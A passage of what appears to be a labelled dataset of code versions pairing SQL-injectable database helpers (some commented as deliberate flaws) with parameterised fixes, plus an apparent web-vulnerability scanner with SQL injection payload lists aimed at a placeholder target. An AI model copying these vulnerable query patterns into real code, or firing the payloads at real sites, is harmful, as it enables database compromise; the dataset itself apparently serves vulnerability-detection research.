                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection=self.connect()

        try:
            query=""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
            return cursor.fetchall()
        finally:
            connection.close()



    def add_input(self,data):
        connection = self.connect()

        try:
            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()



    def clear_input(self):
        connection = self.connect()

        try:
            query =""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()

/n/n/n",1
178,178,d54c54c41c6f6fc9a1430eb7f6b8b663540400e0,"dbhelper.py/n/nimport pymysql
import dbconfig


class DBHelper:

    def connect(self, database='crimemap'):
        return pymysql.connect(host='localhost',
                                user=dbconfig.db_user,
                                password=dbconfig.db_password,
                                db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = ""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            query = ""INSERT INTO crimes (description) VALUES (%s);""
            with connection.cursor() as cursor:
                cursor.execute(query, data)
                connection.commit()
        finally:
            connection.close()
        
    def clear_all(self):
        connection = self.connect()
        try:
            query = ""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()/n/n/n",0
179,179,d54c54c41c6f6fc9a1430eb7f6b8b663540400e0,"/dbhelper.py/n/nimport pymysql
import dbconfig


class DBHelper:

    def connect(self, database='crimemap'):
        return pymysql.connect(host='localhost',
                                user=dbconfig.db_user,
                                password=dbconfig.db_password,
                                db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = ""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # The following introduces a deliberate security flaw
            # See section on SQL injection below
            query = ""INSERT INTO crimes (description) VALUES \
                    ('{}');"".format(data)
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()
        
    def clear_all(self):
        connection = self.connect()
        try:
            query = ""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()/n/n/n",1
18,18,2b585ad33975d3f155fd07d76d0f503f6f38a7a7,"payloads/inject.py/n/nimport requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

def injectPayload(url, paramname, method, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = """"

	
	#if get
	if method == ""GET"":
		getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == ""POST"":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text

	result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
	
	#if function returns:
	if result is not None:
		print payload
		#generateExploit(parsedURL, method, paramname, payload)
		return payload
	return None

def timeid(full=False):
	if full==False:
		return datetime.now().strftime(""%S-%f"")
	else:
		return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

	dirname = ""exploits/""
	if not os.path.exists(dirname):
		os.makedirs(dirname)

	copy(""exploit.py"", dirname)

	f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
	f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
	


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
	if v == True:
		print html

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None
		return match

	#======= check for shell command injection ======
	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None
		return match

	#===== check for sql_injection ======
	if attackType == sql_injection:
		
		falsePayload = sqli.get_false()
		#if get
		if method == ""GET"":
			getURL = parsedURL + ""?"" + paramname+""=""+falsePayload
			content = requests.get(getURL)
			badhtml =  content.text
		#if post
		elif method == ""POST"":
			content = requests.post(url, data={paramname:falsePayload})
			badhtml = content.text

		compare_res = sqli.compare_html(badhtml, html)		
		match = re.findall(r'<ins>.+', compare_res)
		if len(match) ==0 :
			return None
		return match

	#====== check for open_redirect=======
	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
			return True

	
	#=======check for server_injection ====
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + ""/index.php"")

		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if ""GNU/Linux"" in html:
			return attackType

	return None;
	

if __name__ == ""__main__"":
	## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


	# ## test shell command
	# ## post in the form
	# url = ""/commandinjection/commandinjection.php""
	# payloads = cmd.get_all()
	# for payload in payloads:
	# 	injectPayload(url, ""host"", 'POST', payload)

	#sqli
	# post in the form
	url = ""/sqli/sqli.php""
	payloads = sqli.get_all()
	for payload in payloads:
		injectPayload(url, ""username"", ""POST"", payload)

	#Test for server side code injection
	# url = ""/serverside/eval2.php""
	# payloads = ssci.get_all(url)
	# for payload in payloads:
	# 	injectPayload(url, ""page"", ""POST"", payload)
	'''
	#test for open redirect
	url = ""/openredirect/openredirect.php""
	orPayload = oRedirect.get_all()
	for payload in orPayload:
	 	injectPayload(url, ""redirect"", ""GET"", payload)
	'''
/n/n/npayloads/sqli.py/n/nimport difflib

def get_false():
	payloads = [""' and ' 1=2""]
	return payloads

def get_all():
	""""""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	""""""
	payloads = [""' or '1=1"", ""' or 1=1--"", ""'=1\' or \'1\' = \'1\'"", ""'1 'or' 1 '=' 1"", ""'or 1=1#"", ""' OR '1'='1' --"", ""' OR '1'='1' %00""]
	payloads = [(item, ""SQL Injection"") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = """"
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == ""-""):
			diff_html += ""<del>%s</del>"" % ele[1:].strip()
		elif(ele[0] == ""+""):
			diff_html += ""<ins>%s</ins>"" %ele[1:].strip()

	return diff_html

if __name__ == ""__main__"":	
	print get_all()
/n/n/n",0
19,19,2b585ad33975d3f155fd07d76d0f503f6f38a7a7,"/payloads/inject.py/n/nimport requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

def injectPayload(url, paramname, method, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = """"

	
	#if get
	if method == ""GET"":
		getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == ""POST"":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text

	result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
	
	#if function returns:
	if result is not None:
		print payload
		#generateExploit(parsedURL, method, paramname, payload)
		return payload
	return None

def timeid(full=False):
	if full==False:
		return datetime.now().strftime(""%S-%f"")
	else:
		return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

	dirname = ""exploits/""
	if not os.path.exists(dirname):
		os.makedirs(dirname)

	copy(""exploit.py"", dirname)

	f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
	f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
	


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
	if v == True:
		print html

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None
		return match

	#======= check for shell command injection ======
	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None
		return match

	#===== check for sql_injection ======
	if attackType == sql_injection:
		
		falsePayload = sqli.get_false()
		#if get
		if method == ""GET"":
			getURL = parsedURL + ""?"" + paramname+""=""+falsePayload
			content = requests.get(getURL)
			badhtml =  content.text
		#if post
		elif method == ""POST"":
			content = requests.post(url, data={paramname:falsePayload})
			badhtml = content.text

		compare_res = sqli.compare_html(badhtml, html)		
		match = re.findall(r'<ins>.+', compare_res)
		if len(match) ==0 :
			return None
		return match

	#====== check for open_redirect=======
	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
			return True

	
	#=======check for server_injection ====
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + ""/index.php"")

		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if ""GNU/Linux"" in html:
			return attackType

	return None;
	

if __name__ == ""__main__"":
	## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


	# ## test shell command
	# ## post in the form
	# url = ""/commandinjection/commandinjection.php""
	# payloads = cmd.get_all()
	# for payload in payloads:
	# 	injectPayload(url, ""host"", 'POST', payload)

	#sqli
	# post in the form
	#url = ""/sqli/sqli.php""
	#payloads = sqli.get_all()
	#for payload in payloads:
	#	injectPayload(url, ""username"", ""POST"", payload)

	#Test for server side code injection
	url = ""/serverside/eval2.php""
	payloads = ssci.get_all(url)
	for payload in payloads:
		injectPayload(url, ""page"", ""POST"", payload)
	'''
	#test for open redirect
	url = ""/openredirect/openredirect.php""
	orPayload = oRedirect.get_all()
	for payload in orPayload:
	 	injectPayload(url, ""redirect"", ""GET"", payload)
	'''
/n/n/n/payloads/sqli.py/n/nimport difflib

def get_false():
	payloads = [""' and ' 1=2""]
	return payloads

def get_all():
	payloads = [""' or '1=1""]
	payloads = [(item, ""SQL Injection"") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = """"
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == ""-""):
			diff_html += ""<del>%s</del>"" % ele[1:].strip()
		elif(ele[0] == ""+""):
			diff_html += ""<ins>%s</ins>"" %ele[1:].strip()

	return diff_html

if __name__ == ""__main__"":	
	print get_all()
/n/n/n",1
110,110,c2bc9d0199ce90ae628efc10c51d252713caaeaf,"dbhelper.py/n/n# -*- coding: utf-8 -*-
import pymysql
import db_config


class DBHelper:
    
    def connect(self, database=""crimemap""):
        return pymysql.connect(host='localhost',
                    user=db_config.db_user,
                    password=db_config.db_password,
                    db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = ""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # protection from SQL Injections, previously use {}
            # The following introduces a deliberate security flaw
            query = ""INSERT INTO crimes (description) VALUES (%s);""
            with connection.cursor() as cursor:
                cursor.execute(query, data)
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = ""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()
    



/n/n/n",0
111,111,c2bc9d0199ce90ae628efc10c51d252713caaeaf,"/dbhelper.py/n/n# -*- coding: utf-8 -*-
import pymysql
import db_config


class DBHelper:
    
    def connect(self, database=""crimemap""):
        return pymysql.connect(host='localhost',
                    user=db_config.db_user,
                    password=db_config.db_password,
                    db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = ""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # The following introduces a deliberate security flaw
            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = ""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()
    



/n/n/n",1
102,102,09109f0bedf10b0a54e5a211c54e039ed049e443,"nrf24/nrf24.py/n/n#!/usr/bin/env python

'''
	This code includes usage of nRF24L01 on Arduino Uno.
	Connection table = http://tmrh20.github.io/RF24/

	@author Çağatay Tanyıldız
	@email  cagataytanyildiz[at]protonmail[dot]com
'''
import time
from datetime import datetime
import sys
from struct import unpack
from RF24 import RF24
import psycopg2

irq_gpio_pin = None
con = None

radio = RF24(22, 0)

#EXAMPLE_TIMESTAMPT=strftime(""%Y-%m-%d %H:%M:%S"", gmtime())
#EXAMPLE_LOG=""""""INSERT INTO LOGS
#(HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)
#VALUES(""""""+str(values[1])+""','""+str(values[2])+""','""+str(values[3])+""','""+values[4]+""','""+str(EXAMPLE_TIMESTAMPT)+""','""+str(EXAMPLE_TIMESTAMPT)+""""""',1)
#""""""

def get_data_from_node():
	if radio.available():
		while radio.available():
			length = 10
			receive_payload = radio.read(length)
			values = unpack('hhhhh',receive_payload)
			print ""Node Number: ""+str(values[0])+""\nLight: ""+str(values[1])+"" Humidity: ""+str(values[2])+"" Temperature: ""+str(values[3])+"" MQ6: ""+str(values[4])
			#TIMESTAMPT = ""(%s)"",(datetime.now(),)
			#LOG=""INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)	VALUES(""+str(values[1])+"",""+str(values[2])+"",""+str(values[3])+"",""+str(values[4])+"",('%s'),('%s'),1);"" % (datetime.now(),datetime.now(),)
			log=""INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID) VALUES (%s, %s, %s, %s, %s, %s, %s);""
			vals = values[:4] + [datetime.now(),datetime.now(), 1]
			write_to_db(log, vals)
			#write_to_db(LOG)

def write_to_db(log, vals):
	try:
		con = psycopg2.connect(database='dname', user='uname', password='pass')
		con.cursor().execute(log, vals)
		con.commit()
	except psycopg2.DatabaseError, e:
		print 'Error %s' % e
		sys.exit(1)

pipes = [""0Node"", ""1Node""]
radio.begin()
radio.setRetries(15,15)
radio.printDetails()

radio.openWritingPipe(pipes[1])
radio.openReadingPipe(1,pipes[0])
radio.startListening()

while 1:
	get_data_from_node()
	time.sleep(0.1)
/n/n/n",0
103,103,09109f0bedf10b0a54e5a211c54e039ed049e443,"/nrf24/nrf24.py/n/n#!/usr/bin/env python

'''
	This code includes usage of nRF24L01 on Arduino Uno.
	Connection table = http://tmrh20.github.io/RF24/

	@author Çağatay Tanyıldız
	@email  cagataytanyildiz[at]protonmail[dot]com
'''
import time
from datetime import datetime
import sys
from struct import unpack
from RF24 import RF24
import psycopg2

irq_gpio_pin = None
con = None

radio = RF24(22, 0)

#EXAMPLE_TIMESTAMPT=strftime(""%Y-%m-%d %H:%M:%S"", gmtime())
#EXAMPLE_LOG=""""""INSERT INTO LOGS
#(HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)
#VALUES(""""""+str(values[1])+""','""+str(values[2])+""','""+str(values[3])+""','""+values[4]+""','""+str(EXAMPLE_TIMESTAMPT)+""','""+str(EXAMPLE_TIMESTAMPT)+""""""',1)
#""""""

def get_data_from_node():
	if radio.available():
		while radio.available():
			length = 10
			receive_payload = radio.read(length)
			values = unpack('hhhhh',receive_payload)
			print ""Node Number: ""+str(values[0])+""\nLight: ""+str(values[1])+"" Humidity: ""+str(values[2])+"" Temperature: ""+str(values[3])+"" MQ6: ""+str(values[4])
			#TIMESTAMPT = ""(%s)"",(datetime.now(),)
			LOG=""INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)	VALUES(""+str(values[1])+"",""+str(values[2])+"",""+str(values[3])+"",""+str(values[4])+"",('%s'),('%s'),1);"" % (datetime.now(),datetime.now(),)
			write_to_db(LOG)

def write_to_db(LOG):
	try:
		con = psycopg2.connect(database='dname', user='uname', password='pass')
		con.cursor().execute(LOG)
		con.commit()
	except psycopg2.DatabaseError, e:
		print 'Error %s' % e
		sys.exit(1)

pipes = [""0Node"", ""1Node""]
radio.begin()
radio.setRetries(15,15)
radio.printDetails()

radio.openWritingPipe(pipes[1])
radio.openReadingPipe(1,pipes[0])
radio.startListening()

while 1:
	get_data_from_node()
	time.sleep(0.1)
/n/n/n",1
152,152,2158db051408e0d66210a99b17c121be008e20b6,"flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(""%s %s"" % (order_column, order_direction))
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

